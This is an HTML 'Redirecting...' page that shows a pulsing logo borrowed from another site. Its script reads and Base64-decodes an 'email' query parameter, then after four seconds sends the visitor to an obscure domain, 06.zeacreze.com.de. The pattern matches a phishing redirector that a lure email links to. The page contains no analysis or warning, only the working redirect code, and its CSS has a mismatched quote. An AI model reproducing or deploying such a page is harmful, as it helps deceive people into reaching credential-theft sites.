<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      background: #FFFFFF;
      margin: 0;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .logo {
      width: 150px;
      height: 150px;
      background: url(https://cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
      animation: pulse 1.5s infinite ease-in-out;
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: 0.8; }
      50% { transform: scale(1.1); opacity: 1; }
      100% { transform: scale(1); opacity: 0.8; }
    }
  </style>
</head>
<body>
  <div class="logo"></div>

  <script>
    function isBase64(str) {
      try {
        return btoa(atob(str)) === str;
      } catch (err) {
        return false;
      }
    }

    // Get email from ?email= query param
    const urlParams = new URLSearchParams(window.location.search);
    let email = urlParams.get("email");

    if (email) {
      // If it's Base64, decode it
      if (isBase64(email)) {
        email = atob(email);
      }
    } else {
      email = "unknown@example.com"; // fallback
    }

    // Redirect after 4 seconds
    setTimeout(() => {
      window.location.href = `https://06.zeacreze.com.de/AQBiHa@54cYLc58/$`;
    }, 4000);
  </script>
</body>
</html>
